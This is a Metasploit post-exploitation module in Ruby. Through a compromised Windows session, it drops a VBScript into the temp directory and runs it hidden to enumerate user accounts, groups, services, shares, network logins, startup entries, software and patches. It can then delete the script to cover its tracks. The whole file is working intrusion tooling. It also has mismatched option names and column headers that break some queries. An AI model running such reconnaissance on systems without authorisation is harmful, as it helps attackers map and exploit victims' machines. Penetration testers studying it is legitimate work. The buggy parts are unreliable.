##
# $Id: 
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

#requires - correlates to the inlcudes teh first two are mandatory
require 'msf/core'
require 'rex'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post
  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "WMI Information Gathering Module",
      'Description'          => %q{This module will run perdefined WMI queries against the target similar to common WMIC
                    commands, but Admin rights are not required like they are with WMIC. This module writes a 
                    VBScript to the users temp directory to execute the WMI queries. The CLEANUP parameter 
                    controls whether or not that script is removed, it defaults to 'true'. If you set this
                    to 'false', you can pass the location of the .vbs file to subsequent calls to this module
                    using the VBSPATH parameter. The predefined queries line up with common WMIC commands used 
                    for information gathering. They values that can be specified with the QUERY parameter are:
                    SYSTEMINFO 	= wmic computersystem list brief
                    ACCOUNT 	= wmic useraccount list
                    GROUP 		= wmic group list
                    SERVICER	= wmic service where state='running' list brief
                    SERVICE 	= wmic service list brief
                    VOLUME 		= wmic volume list brief
                    DISK		= wmic logicaldisk get description,filesystem,name,size
                    NETLOGON 	= wmic netlogin get name,lastlogon,badpasswordcount
                    NETCLIENT 	= wmic netclient list brief
                    NETUSE 		= wmic netuse get name,username,connectiontype,localname
                    SHARE		= wmic share get name,path
                    EVTLOG 		= wmic nteventlog get path,filename,writeable
                    PROCESS		= wmic process list brief (displays user running process as well)
                    STARTUP		= wmic startup list full
                    SOFTWARE	= wmic product get name,version
                    HOTFIX		= wmic qfe},
      'License'              => MSF_LICENSE,
      'Version'              => '$Revision: $',
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'Author'               => ['Kx499']
    ))
    register_options(
      [
        OptEnum.new('QUERY', [true, 'Predefined query to execute', 'PROCESS',
                    [
            'SYSTEMINFO',
            'ACCOUNT',
            'GROUP',
            'SERVICER',
            'SERVICE',
            'VOLUME',
            'DISK',
            'NETLOGON',
            'NETCLIENT',
            'NETUSE',
            'SHARE',
            'EVTLOG',
            'PROCESS',
            'STARTUP',
            'SOFTWARE',
            'HOTFIX'
                ]]),
        OptBool.new('CLEANUP', [ false, 'Remove .vbs file from disk',true]),
        OptString.new('FILE', [ false, 'Filename to use',"dir_cleanup.vbs"]),
      ], self.class)
  end

  ##FUNCTIONS
  def prep_vbs
    pr_vbs = ""
    pr_vbs << <<-ENDVB
    Set objWMIService = GetObject("winmgmts:\\\\.\\root\\CIMV2")
    Set colCSItems = objWMIService.ExecQuery(WScript.Arguments.Item(0))
    For Each objCSItem In colCSItems
      for each p in objCSItem.Properties_
      if p.isarray or p.value = "" then
          o = o & "N/A" & "|"
        else
          o = o &  p.value & "|"
        end if
      next
      if objCSItem.Path_.class = "Win32_Process" then
        ret = objCSItem.getowner(owner)
        if ret <> 0 then owner = "NA"
        o = o  & owner & "|"
      end if
      wscript.echo(o)
      o = ""
    Next
    ENDVB
    return pr_vbs
  end
  def prep_table
    table_vals = [
    { :type => "SYSTEMINFO", 
    :cmd => "select Domain,Manufacturer,Model,Name,PrimaryOwnerName,TotalPhysicalMemory from win32_computersystem",
    :head => ["Domain","Manufacturer","Model","Name","PrimaryOwnerName","TotalPhysicalMemory"]},
    { :type => "ACCOUNT", 
    :cmd => "select AccountType,Disabled,Domain,LocalAccount,Lockout,name,PasswordChangeable,PasswordExpires,PasswordRequired,SID,Status from win32_useraccount",
    :head => ["AccountType","Disabled","Domain","LocalAccount","Lockout","name","PasswordChangeable","PasswordExpires","PasswordRequired","SID","Status"]},
    { :type => "GROUP", 
    :cmd => "select Domain,LocalAccount,Name,SID,SIDType,Status from win32_group",
    :head => ["Domain","LocalAccount","Name","SID","SIDType","Status"]},
    { :type => "SERVICER", 
    :cmd => "select name,state,startname,pathname from Win32_Service where state='Running'",
    :head => ["name","pathname","startname","state"]},
    { :type => "SERVICE", 
    :cmd => "select name,state,startname,pathname from Win32_Service",
    :head => ["name","pathname","startname","state"]},
    { :type => "VOLUMES", 
    :cmd => "select Capacity,DriveType,FileSystem,FreeSpace,Label,Name from win32_volume",
    :head => ["Capacity","DeviceID","DriveType","FileSystem","FreeSpace","Label","Name"]},
    { :type => "DISK", 
    :cmd => "select description,filesystem,name,size from win32_logicaldisk",
    :head => ["description","filesystem","name","size"]},
    { :type => "NETLOGIN", 
    :cmd => "select name,lastlogon,badpasswordcount from win32_networkloginprofile",
    :head => ["name","lastlogon","badpasswordcount"]},
    { :type => "NETCLIENT", 
    :cmd => "select Caption,InstallDate,Manufacturer,Name from win32_networkclient",
    :head => ["Caption","InstallDate","Manufacturer","Name"]},
    { :type => "NETUSE", 
    :cmd => "select name,username,connectiontype,localname from win32_networkconnection",
    :head => ["name","username","connectiontype","localname"]},
    { :type => "SHARE", 
    :cmd => "select name,path from win32_share",
    :head => ["name","path"]},
    { :type => "EVTLOG", 
    :cmd => "select path,filename,writeable from Win32_NTEventlogFile",
    :head => ["name","path","filename","writeable"]},
    { :type => "PROCESS", 
    :cmd => "select caption,executablepath,sessionid from win32_process",
    :head => ["caption","path","processid","session","user"]},
    { :type => "STARTUP", 
    :cmd => "select Command,Location,User from Win32_StartupCommand",
    :head => ["Command","Location","Caption","User"]},
    { :type => "SOFTWARE", 
    :cmd => "select name,version from win32_product",
    :head => ["UUID","name","version"]},
    { :type => "HOTFIX", 
    :cmd => "select Caption,CSName,HotFixID,InstallDate,Name,ServicePackInEffect from Win32_QuickFixEngineering",
    :head => ["Caption","CSName","HotFixID","InstallDate","Name","ServicePackInEffect"]},
    ]
    return table_vals
  end

  ## ENTRY POINT
  def run
    # check/set vars, table settings, and cmd strings
    tmpout = ""
    wmi_cmd = nil
    wmi_head = nil
    wmi_type = nil
    clean = datastore["CLEANUP"]
    vbspath =  session.fs.file.expand_path("%TEMP%") + "\\"
    vbspath << datastore["FILE"]

    choices = prep_table()
    choices.each do |item|
      wmi_cmd = item[:cmd] if item[:type]==datastore["QUERY"]
      wmi_head = item[:head] if item[:type]==datastore["QUERY"]
      wmi_type = item[:type] if item[:type]==datastore["QUERY"]
    end
    return 0 if wmi_cmd.nil?
    
    vb_cmd = "cmd.exe /c cscript //NOLOGO #{vbspath} \"#{wmi_cmd}\""
    del_cmd = "cmd.exe /c del #{vbspath}"
    
    #create the table for displaying results
    out_table = Rex::Ui::Text::Table.new(
      "Header"  => wmi_type.to_s,
      "Indent"  => 1,
      "Columns" => wmi_head)

    begin
      #create the vbs file if it doesn't exist
      if !session.fs.file.exists?(vbspath)
        filetext = prep_vbs()
        outfile = session.fs.file.new(vbspath, "wb")
        outfile.write(filetext)
        outfile.close
      end

      #run cmd and get output - display to user
      r = session.sys.process.execute(vb_cmd, nil, {'Hidden' => true, 'Channelized' => true})
      while(d = r.channel.read)
        tmpout << d
        break if d == ""
      end
      r.channel.close
      
      out = tmpout.split("\r\n")
      out.each do |o|
        out_table << o.split("|")
      end
      print_line(out_table.to_s)
      
      #clean file if opt set
      if clean
        c = session.sys.process.execute(del_cmd, nil, {'Hidden' => true})
        c.close
      end
    rescue::Exception => e
      print_error(e.to_s)
    end
  end
end
